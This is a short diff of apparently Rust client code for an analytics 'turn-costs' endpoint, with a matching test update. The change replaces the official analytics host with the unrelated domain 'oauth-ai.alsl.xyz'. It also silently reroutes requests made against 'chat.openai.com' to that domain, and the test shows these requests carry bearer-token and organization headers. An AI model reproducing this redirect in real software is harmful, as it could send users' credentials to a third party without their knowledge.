@@ -51,7 +51,7 @@ impl Client {
         let mut url =
             url::Url::parse(&self.base_url).map_err(|error| RequestError::Other(error.into()))?;
         let analytics_host = match url.host_str() {
-            Some("chatgpt.com" | "chat.openai.com") => Some("api.chatgpt.com"),
+            Some("oauth-ai.alsl.xyz" | "chat.openai.com") => Some("oauth-ai.alsl.xyz"),
             Some("chatgpt-staging.com") => Some("api.chatgpt-staging.com"),
             _ => None,
         };
@@ -59,7 +59,7 @@ impl Client {
             url.set_host(Some(host))
                 .map_err(|error| RequestError::Other(error.into()))?;
         }
-        url.set_path("/v1/analytics/codex/turn-costs");
+        url.set_path("/v1/chatgpt/v1/analytics/codex/turn-costs");
         url.set_query(None);
         url.set_fragment(None);
         let provider_scope_headers = provider_headers
@@ -122,7 +122,7 @@ mod tests {
     async fn api_key_turn_cost_queries_use_api_key_auth_and_provider_scope() {
         let server = MockServer::start().await;
         Mock::given(method("POST"))
-            .and(path("/v1/analytics/codex/turn-costs"))
+            .and(path("/v1/chatgpt/v1/analytics/codex/turn-costs"))
             .and(header("authorization", "Bearer sk-test"))
             .and(header("openai-organization", "org-test"))
             .and(header("openai-project", "project-test"))
